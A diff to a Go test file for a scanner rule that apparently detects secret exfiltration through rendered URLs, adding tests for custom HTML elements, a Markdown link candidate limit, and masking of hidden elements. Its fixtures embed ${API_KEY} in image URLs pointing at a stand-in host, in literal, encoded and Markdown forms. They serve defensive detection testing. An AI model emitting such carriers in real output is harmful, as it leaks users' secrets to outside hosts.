@@ -78,6 +78,7 @@ func TestRenderedURLAttributesDecodeCharacterReferencesOnce(t *testing.T) {
 		want          int
 	}{
 		{name: "literal HTML", carrier: `<img src="https://example.invalid/?q=${API_KEY}">`, want: 1},
+		{name: "custom HTML element", carrier: `<img-preview src="https://example.invalid/?q=${API_KEY}">`},
 		{name: "single encoded HTML", carrier: `<img src="https://example.invalid/?q=&#36;{API_KEY}">`, want: 1},
 		{name: "double encoded HTML", carrier: `<img src="https://example.invalid/?q=&amp;#36;{API_KEY}">`},
 		{name: "literal Markdown", carrier: `![preview](https://example.invalid/?q=${API_KEY})`, want: 1},
@@ -98,6 +99,49 @@ func TestRenderedURLAttributesDecodeCharacterReferencesOnce(t *testing.T) {
 			}
 			t.Fatal("rendered URL rule RX001 is missing")
 		})
+	}
+}
+
+func TestMarkdownURLCandidateLimitBoundsAllocation(t *testing.T) {
+	const (
+		limit = 4096
+		link  = "[guide](https://example.invalid/help)\n"
+	)
+	rxCheck := rendertext.Rules()[1]
+	if rxCheck.Rule().ID != "RX001" {
+		t.Fatal("rendered URL check is unavailable")
+	}
+	ctx := t.Context()
+	allocations := make([]float64, 0, 2)
+	for _, count := range []int{limit, limit + 1, limit * 4} {
+		text := strings.Repeat(link, count)
+		doc := document.Prepare(ctx, artifact.NewFile("README.md", []byte(text), false))
+		out, err := rxCheck.Find(ctx, doc, 1)
+		if len(out.Matches) != 0 || out.Truncated || (err != nil) != (count > limit) {
+			t.Fatalf("candidate count %d: unexpected result %+v and error %v", count, out, err)
+		}
+		if count > limit {
+			allocations = append(allocations, testing.AllocsPerRun(2, func() {
+				_, _ = rxCheck.Find(ctx, doc, 1)
+			}))
+		}
+	}
+	if allocations[1] > 2*allocations[0] {
+		t.Fatalf("rejected candidates increased allocations from %.0f to %.0f", allocations[0], allocations[1])
+	}
+}
+
+func TestVisibleMasksHiddenStandaloneElements(t *testing.T) {
+	for _, element := range []string{
+		`<img hidden alt="Draft illustration">`,
+		`<image aria-hidden="true" title="Draft illustration" />`,
+	} {
+		const prefix, suffix = "Public introduction. ", " Public conclusion."
+		text := prefix + element + suffix
+		want := prefix + strings.Repeat(" ", len(element)) + suffix
+		if got, err := rendertext.Visible(t.Context(), text); err != nil || got != want {
+			t.Errorf("visible text=%q, error=%v, want %q", got, err, want)
+		}
 	}
 }
 
